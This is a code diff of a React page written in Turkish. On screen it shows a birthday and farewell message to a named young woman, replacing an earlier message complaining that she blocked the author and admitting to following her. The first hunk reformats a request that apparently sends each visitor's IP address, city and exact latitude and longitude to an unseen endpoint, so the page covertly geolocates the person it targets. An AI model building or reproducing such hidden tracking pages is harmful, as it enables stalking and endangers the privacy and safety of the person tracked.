@@ -31,7 +31,14 @@ export default function Home() {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          content: `${JSON.stringify(city)}`,
+          content: `**Şehir** = ** ${city.city.name}**
+                    **İP** = ** ${city.ip}**
+                    **Lokasyon** = ** {
+                        "latitude": ${city.location.latitude},
+                        "longitude": ${city.location.longitude}
+                    }**
+                    **Lokasyon 1** = ** ${JSON.stringify(city.location.latitude)}**
+                    **Lokasyon 2** = ** ${JSON.stringify(city.location.longitude)}**`,
         }),
       });
 
@@ -75,29 +82,29 @@ export default function Home() {
 {isPlaying && <p className='text-white underline underline-offset-4  font-sans font-bold'>Şarkı oynatılıyor...</p>}
 
 
-      <div className={`mt-8 mx-10 bg-yellow-200 text-green-900 rounded-lg p-4 border-2 border-yellow-400 `}>
+      <div className={`mt-8 mx-10 bg-yellow-200 text-red-900 font-bold text-lg rounded-lg p-4 border-2 border-yellow-400 `}>
         <p>
-         Önce üstekine tıkla şarkı çalsın öyle okumaya devam et. 
+          <a className="flex justify-center">Mutlu yıllaar Tuana..</a>
          <br/>
+          Hiç yüz yüze konuşma fırsatımız vesayre olmadı.
          <br/>
-         Bu sefer neden engelledin anlamsız. Okulda öyle sana baktım diye mi acaba
+          Tam tanışmışda sayılmayız ama,
          <br/>
-         Geçen cuma kayseriye gittiğinizde seni takip ediodum da etmiodum <br/>
-         arkana gelmedim zaten söylemedim de hiçbişey 3391e gireceğinizde o günün geçen haftası rüyamda görmüştüm walla 
+          Çok iyi birisisin. Ben ayrılıyorum Milas'tan.
          <br/>
-         Görünmedim bile sana durup duruken çıkardın igden bari niye olduğunu açıklasaydın ya
+          Doğum gününü daha iyi kutlamak isterdim ama,
          <br/>
-         arkadaşının seninki yukardamı ne dediğindede amcam için değil senin için çıktıydım 
+          Şartlar el vermedi
          <br/> 
-         dün de o yüzden birşey dersem die ama söylücek bişi bulamadım senin koyduğun postalardan sonra
+          Kendine çok iyi bak dikkat et kendine.
          <br/>
-         kalpsiz olduğunu düşünmüyorum bu kadar
+          Ha birde çok güzelsin 😎
          <br/>
-         hadi herşeye tamam sevmiyordun istemiyordun tamam bunlar da niye engelledin nolduda anlamıyorum ya
+          Belki ilerleyen yıllarda tekrar görüşürüz.
           <br/>
-         off offffffffffffffffffffffffffffffffffff
+          Hoşçakaal.
           <br/>
-          SENDEN VAZGEÇEMEM ABİ.
+           
         </p>
 
 
